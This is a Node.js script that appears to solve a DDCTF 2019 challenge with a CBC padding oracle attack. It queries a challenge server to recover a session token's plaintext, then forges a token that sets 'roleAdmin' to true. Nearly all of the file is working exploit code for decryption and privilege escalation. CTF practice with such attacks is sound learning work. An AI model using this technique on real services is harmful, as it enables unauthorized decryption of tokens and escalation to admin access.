const got = require('got')
const pAll = require('p-all')
const pad = require('left-pad')
const delay = require('delay')
const _ = require('lodash')
const Gauge = require('gauge')

const TOKEN = 'UGFkT3JhY2xlOml2L2NiY8O+7uQmXKFqNVUuI9c7VBe42FqRvernmQhsxyPnvxaF'
const ALL_HEX = Array.from(Array(256)).map((v, i) => pad(i.toString(16), 2, 0))
const BLOCK_SIZE = 16
const THROTTLE = 20

const MESSAGE_DECRYPT_ERROR = 'decrypt err~'
const MESSAGE_PARSE_ERROR = 'parse json err~'
const MESSAGE_ORIGINAL = '{"id":100,"roleAdmin":false}'

/**
 * e.g.:
 * ```
 * replace(Buffer.from('abcd'), 1, '7879')
 * // 'axyd'
 * replace(Buffer.from('abcd'), -2, '7879')
 * // 'abxy'
 */
function replace (buf, pos, hex) {
  let len = hex.length / 2
  let end = pos + len
  if (pos < 0) {
    return replace(buf, buf.length + pos, hex)
  }
  if (end > buf.length) {
    throw new Error('The replacement will overflow.')
  }
  return Buffer.from(buf).fill(hex, pos, end, 'hex')
}

async function verify (token) {
  let response = await got('http://116.85.48.104:5023/api/account_info', {
    headers: {
      host: 'c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com',
      cookie: `token=${token}`,
    },
    retry: 5,
  })
  return response.body
}

/**
 * https://www.freebuf.com/articles/web/15504.html
 * https://image.3001.net/uploads/image/20131028/20131028140812_51657.png
 */
const crackByteAt = async (buf, blockIndex, byteIndex) => {
  const position =  BLOCK_SIZE * blockIndex + byteIndex
  const original = buf[position]
  console.log('Crackinng byte at %s of Block %s', byteIndex, blockIndex)
  console.log('Original Hex:', original.toString(16))

  const gauge = new Gauge()
  let passed = []
  await pAll(ALL_HEX.map((hex, i) => async () => {
    let modified = replace(buf, position, hex)
    let message = await verify(modified.toString('base64'))
    message = message.trim()
    gauge.show(`Verify modified Hex: ${hex}, Message: ${message}`, i / ALL_HEX.length)
    if (message !== MESSAGE_DECRYPT_ERROR) {
      let nextIntermediary = parseInt(hex, 16) ^ (BLOCK_SIZE - byteIndex)
      let nextPlain = nextIntermediary ^ original
      passed.push({
        hex,
        message,
        nextIntermediary,
        nextPlain,
      })
    }
    await delay(THROTTLE)
  }), { concurrency: 1 })
  gauge.hide()

  if (!passed.length) {
    throw new Error('Cannot find any replacement hex')
  }

  if (passed[0].hex === original.toString(16)) {
    passed = passed.slice(1).concat(passed[0])
  }

  console.log('Passed:\n', JSON.stringify(passed, null, 2))
  return passed
}

const replaceWithPadding = (buf, intermediaries, blockIndex, padding, blockSize = BLOCK_SIZE) => {
  let b = Buffer.from(buf)
  for (let j = blockSize - 1; j > blockSize - padding; j--) {
    let hex = pad((padding ^ intermediaries[j]).toString(16), 2, '0')
    let position = blockIndex * blockSize + j
    console.log('Replacing with padding at %s: 0x%s', position, hex)
    b = replace(b, position, hex)
  }
  return b
}

const crackBlock = async (buf, blockIndex) => {
  let data = {}
  try {
    for (let padding = 1; padding <= BLOCK_SIZE; padding++) {
      let byteIndex = BLOCK_SIZE - padding
      let intermediaries = _.mapValues(data, ({ nextIntermediary }) => nextIntermediary)
      console.log('Intermediaries (of next block)', JSON.stringify(intermediaries))
      let b = replaceWithPadding(buf, intermediaries, blockIndex, padding)

      let passed = await crackByteAt(b, blockIndex, byteIndex)
      data[byteIndex] = passed[0]
      console.log('Push crack block data:', JSON.stringify(data[byteIndex]))
      console.log('---\n')
    }
  } finally {
    let plain = Buffer.concat(Object.values(_.mapValues(data, ({ nextPlain }) =>
      Buffer.from(pad(nextPlain.toString(16), 2, 0), 'hex'))
    ))
    console.log('Crack block %d Result:', blockIndex)
    console.log(JSON.stringify(data, null, 2))
    console.log('Plain (of next block):')
    console.log(plain.toString())
    console.log('(Hex: %s)', Buffer.from(plain).toString('hex'))
  }
}

function getPreviousVector (plain, intermediaries) {
  let vector = ''
  for (let [i, r] of plain.entries()) {
    let c = r ^ intermediaries[i]
    vector += pad(c.toString(16), 2, 0)
    console.log(i)
  }
  return vector
}

async function main () {
  let buf = Buffer.from(TOKEN, 'base64')
  console.log('---')
  console.log('Original Token Buffer: %s', buf)
  console.log('(Hex: %s)\n', buf.toString('hex'))
  console.log('Length: %d', buf.length)
  console.log('Block: %d', buf.length / BLOCK_SIZE)
  console.log('(Block size: %d)', BLOCK_SIZE)
  console.log('---\n')

  // await crackByteAt(buf, 1, 15)
  // buf = replace(buf, 0 * BLOCK_SIZE, Array.from(Array(32)).map(() => '0').join('')).slice(0, 32)
  // console.log(buf.length)
  // console.log(buf)

  // // -- Step 1: crack block 1 and block 2
  // await crackBlock(buf.slice(0, 32), 0)
  // await crackBlock(buf, 0)

  // await request(TOKEN)
  // let buf = Buffer.from(TOKEN, 'base64')
  // console.log(buf.toString('utf8'))
  // console.log(buf.toString('utf8').length)
  // console.log(buf.toString('hex'))
  // console.log(buf.toString('hex').length)

  // let b = Buffer.from('00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff', 'hex')
  // let r = replaceWithPadding(b, {
  //   15: 0x11,
  // }, 0, 2)
  // console.log(r)

  // let b = Buffer.from('5061644f7261636c653a69762f636263c3beeee4265ca16a35552e23d73b5417b8d85a91bdeae799086cc723e7bf1685', 'hex')
  // let r = replaceWithPadding(b, { '12': 211, '13': 63, '14': 80, '15': 19 }, 1, 5)
  // console.log(b.toString('hex'))
  // console.log(r.toString('hex'))
  // console.log(b.toString('hex').slice(31, 64))
  // console.log(r.toString('hex').slice(31, 64))

  // const replacement = 'b8d72d19bd5e082a085e3623e7bf1685'
  // const str = Buffer.from(replacement, 'hex').toString()
  // console.log(str)

  // let data = ...
  // let intermediaries = Object.values(_.mapValues(data, ({ nextIntermediary }) =>
  //   pad(nextIntermediary.toString(16), 2, 0), 'hex')
  // )
  // console.log(JSON.stringify(intermediaries))

  const BLOCKS = {
    1: {
      plain: Buffer.from('{"id":100,"roleA').toString('hex'),
      // intermediaries: ["2b","43","0d","2b","50","5b","52","5c","55","16","4b","04","40","0f","07","22"].join(''),
      intermediaries: ["00","df","71","d2","71","18","c1","0e","13","14","1c","66","fc","84","61","9b"].join(''),
    },
    2: {
      // plain: Buffer.from('dmin":false}').toString('hex') + '04040404',
      plain: Buffer.from('dmin":true}').toString('hex') + '0505050505',
      intermediaries: ["a7","d3","87","8a","04","66","c7","0b","59","26","4b","5e","d3","3f","50","13"].join(''),
    },
  }

  let cipher = ''
  cipher += getPreviousVector(Buffer.from(BLOCKS[1].plain, 'hex'), Buffer.from(BLOCKS[1].intermediaries, 'hex'))
  cipher += getPreviousVector(Buffer.from(BLOCKS[2].plain, 'hex'), Buffer.from(BLOCKS[2].intermediaries, 'hex'))
  cipher += buf.slice(32).toString('hex')

  let payload = Buffer.from(cipher, 'hex').toString('base64')
  console.log(payload)

  let result = await verify(payload)
  console.log(result)

  // let replacement = replace(plain, 6, Buffer.from('true}').toString('hex') + '0505050505')
  // let cipher = ''
  // for (let [i, r] of replacement.entries()) {
  //   let c = r ^ intermediaries[i]
  //   cipher += pad(c.toString(16), 2, 0)
  // }
  // // let payload = replace(buf, 16, cipher).slice(0, 32)
  // console.log(payload)
  // // let result = await verify(payload.toString('base64'))
  // // console.log(result)
  // // await crackBlock(payload, 0)




}

main()
